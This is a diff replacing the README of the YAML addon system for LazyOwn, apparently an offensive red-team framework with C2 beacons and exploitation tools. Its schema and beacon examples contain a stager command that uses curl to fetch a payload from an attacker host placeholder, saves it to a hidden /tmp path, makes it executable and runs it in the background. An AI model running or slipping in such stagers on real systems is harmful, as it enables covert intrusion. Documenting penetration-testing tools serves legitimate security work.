@@ -1,104 +1,151 @@
-# LazyAddons YAML System
+# lazyaddons
 
-Declarative command creation through YAML configuration files.
+Declarative tool integration layer for LazyOwn. Each YAML file in this
+directory registers an external tool as a first-class CLI command, a pwntomate
+job, and an MCP-accessible tool — without touching any Python source.
 
-## 📂 File Structure
-lazyaddons/
-├── addon1.yaml
-├── addon2.yaml
-└── example.yaml
+There are currently 76 addons covering C2 frameworks, shellcode loaders,
+exploitation tools, scanners, AI agents, and post-exploitation utilities.
 
+## How it works
 
-## 🛠️ Addon Definition
+At startup, `lazyown.py` scans `lazyaddons/*.yaml` and auto-generates a
+`do_<name>` command for each enabled addon. The command:
+1. Clones the repo from `repo_url` to `install_path` if not present.
+2. Runs `install_command` if the install path is a fresh clone.
+3. Substitutes `{param}` tokens with values from `payload.json` and CLI args.
+4. Executes `execute_command` inside `install_path`.
+5. If `lazycommand` is defined, prints it as the command to run on the target.
 
-### Minimal Example
+## YAML schema
+
+### Required fields
+
 ```yaml
-name: "shortname"  # CLI command (do_shortname)
-enabled: true
-description: "Tool description for help system"
-
+name: shortname              # CLI verb: do_shortname, also the tab-complete entry
+description: |               # Shown by help <name>; multi-line allowed
+  What the tool does.
+enabled: true                # false to skip at startup without deleting the file
 tool:
-  name: "Full Tool Name"
-  repo_url: "https://github.com/user/repo"
-  install_path: "tools/toolname"
-  execute_command: "python tool.py -u {url}"
-```  
-Advanced Configuration
+  name: Display Name
+  repo_url: https://github.com/user/repo.git
+  install_path: external/.exploit/toolname
+  execute_command: ./tool --option {param}
+category: "10. Command & Control"   # Must match an existing CLI category
+```
+
+### Optional fields
+
 ```yaml
+author: Author Name
+version: "1.0"
 params:
-  - name: "url"
+  - name: lhost
+    type: string
     required: true
-    description: "Target URL"
-    default: "http://localhost"
-  
-  - name: "threads"
+    description: Attacker IP passed to the tool.
+  - name: lport
+    type: string
     required: false
-    default: 4
-```    
-✨ Features
-Auto-Installation
-Tools clone from Git when missing:
-
-```bash
-git clone <repo_url> <install_path>
+    description: Listener port.
+tool:
+  install_command: make        # Run once after cloning; skip if empty
+  download_file: /tmp/.svc     # Path on target where the payload lands
+  lazycommand: |               # Command to run on the target
+    curl -sk "http://{lhost}:{lport}/payload" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
-Parameter Substitution
-Replaces {param} in commands with values from:
 
-- Command arguments
+### Parameter substitution tokens
 
-- Default values
+| Token | Value source |
+|-------|-------------|
+| `{lhost}` | `payload.json["lhost"]` |
+| `{lport}` | `payload.json["lport"]` |
+| `{rhost}` | `payload.json["rhost"]` |
+| `{rport}` | `payload.json["rport"]` |
+| `{domain}` | `payload.json["domain"]` |
+| `{c2_port}` | `payload.json["c2_port"]` |
+| `{<key>}` | Any key present in `payload.json` |
 
-- self.params
+### Install path convention
 
-- Help Integration
+All addon repos clone under `external/.exploit/<name>`. This keeps vendored
+code out of the project root and under a consistent path that `.gitignore`
+excludes.
 
-help <command> displays the YAML description.
+## Beacon addons
 
-🧩 Template
+The beacon family follows a specific build-and-stage pattern:
 
 ```yaml
-name: ""
-enabled: true
-description: ""
-
 tool:
-  name: ""
-  repo_url: ""
-  install_path: ""
-  install_command: ""  # Optional
-  execute_command: ""
-
-params:
-  - name: ""
-    required: true/false
-    default: ""
-    description: ""
+  install_command: make
+  execute_command: >
+    git restore . ; git pull ; make &&
+    cp binary ../../../sessions/binary &&
+    echo "staged at sessions/binary"
+  lazycommand: >
+    curl -sk "http://{lhost}:{lport}/binary" -o /tmp/.svc &&
+    chmod +x /tmp/.svc && /tmp/.svc &
 ```
-▶️ Usage
-Place YAML files in lazyaddons/
 
-Start your CLI application
+The `git restore . ; git pull` before `make` ensures a fresh build. The binary
+stages to `sessions/` for delivery through the C2 file endpoint.
 
-Execute registered commands:
+Current beacon addons:
+- `beacon.yaml` — Windows C beacon with Early Bird APC injection and BOF support
+- `blacksandbeacon.yaml` — Linux C beacon with ELF dlopen BOF support (unique to LazyOwn)
+- `blacksandbeacon_bof.yaml` — Linux BOF loader companion
 
-```bash
-(Cmd) help your_command
-(Cmd) your_command -args
+## Category reference
+
 ```
-🚨 Troubleshooting
-Missing parameters: Verify required fields in YAML
+01. Recon                 07. Pivoting
+02. Scanning              08. Credentials
+03. Enumeration           09. Persistence
+04. Post-Exploitation     10. Command & Control
+05. Exploitation          11. Reporting
+06. Privilege Escalation  12. Miscellaneous
+```
 
-Install failures: Check network/git access
+## Running an addon
 
-Command errors: Validate execute_command syntax
+```
+(LazyOwn) > blacksandbeacon
+(LazyOwn) > beacon
+(LazyOwn) > toposwarm
+```
 
+List all registered addons:
 
-Key features:
-- Clean GitHub-flavored markdown
-- Focused only on YAML addons
-- Includes ready-to-use templates
-- Documents the parameter substitution system
-- Provides troubleshooting tips
+```
+(LazyOwn) > list_addons
+```
 
-Would you like me to add any specific examples or usage scenarios?
+Reload addons without restarting the shell:
+
+```
+(LazyOwn) > reload_addons
+```
+
+## Creating an addon from a GitHub URL
+
+```
+(LazyOwn) > lazyaddon_creator https://github.com/user/tool
+```
+
+Fetches repo metadata, infers install and execute commands, and writes the
+YAML to `lazyaddons/`.
+
+## Troubleshooting
+
+**Clone fails** — check network access. The URL must end with `.git`.
+
+**Install command fails** — run `cd external/.exploit/<name> && make` manually.
+Common causes: missing system packages (`gcc`, `go`, `rust`), wrong make target.
+
+**Parameter not substituted** — verify the key exists in `payload.json`.
+Use `assign <key> <value>` from the CLI to set it.
+
+**Command not found after adding YAML** — run `reload_addons` or restart the
+shell.
